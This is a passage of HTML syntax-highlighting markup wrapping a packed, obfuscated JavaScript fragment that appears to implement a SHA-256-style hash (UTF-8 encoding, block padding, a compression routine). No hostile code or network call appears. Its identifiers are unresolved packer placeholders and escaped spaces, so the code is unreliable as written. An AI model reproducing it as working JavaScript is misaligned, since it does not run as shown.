class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}}}&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">}}&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20k&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">()}&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">()};&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span 